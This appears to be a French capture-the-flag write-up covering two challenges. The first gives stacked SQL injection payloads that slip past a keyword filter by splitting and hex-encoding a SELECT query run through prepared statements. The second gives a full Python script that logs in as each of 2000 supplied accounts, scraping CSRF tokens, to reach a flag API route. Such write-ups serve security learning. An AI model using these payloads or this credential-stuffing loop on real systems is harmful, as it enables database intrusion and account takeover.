## Filtre ou Expresso

L'idée était de passer par une requête préparée:

```sql
1;prepare r from concat('se','lect ',unhex('2a'),' fr','om',' Fl','ag');execute r --
```

ou

```sql
1; EXECUTE IMMEDIATE UNHEX('53454c454354202a2066726f6d20466c6167');
```

## LarHack

L'idée était de:

- scanner les routes api pour découvrir api/users et api/flag
- faire un script qui connecte un utilisateur avec une boucle parmis les 2000 puis renvoyer vers la route api/flag avant de deconnecter l’utilisateur 

```python
#!/usr/bin/env python3

import requests
import json
from bs4 import BeautifulSoup

URL = "http://10.22.148.24"

def brute_force():
    with open('users.json', 'r') as file:
        users = json.load(file)

    i = 0
    for user in users:
        req = requests.get(f'{URL}/login', allow_redirects=True)
        soup = BeautifulSoup(req.text, 'html.parser')
        csrf_token = soup.find('input', {'name': '_token'})['value']

        login_data = {
            'email': user['email'], 
            'password': user['mdp'],
            '_token': csrf_token,           
        }

        print(f"[{str(i)}] Trying user {user['email']}...")
        response = requests.post(f'{URL}/login', data=login_data, allow_redirects=False, cookies=req.cookies)
        if response.status_code == 302:
            flag_response = requests.get(f'{URL}/api/flag', cookies=response.cookies)
            if flag_response.text != 'hsr{c_est_pas_ca}':
                print('[+] Flag found:', flag_response.text)
                break

        requests.get(f'{URL}/disconnect', cookies=response.cookies, allow_redirects=True)
        
        i += 1
            
if __name__ == '__main__':
    brute_force()
```
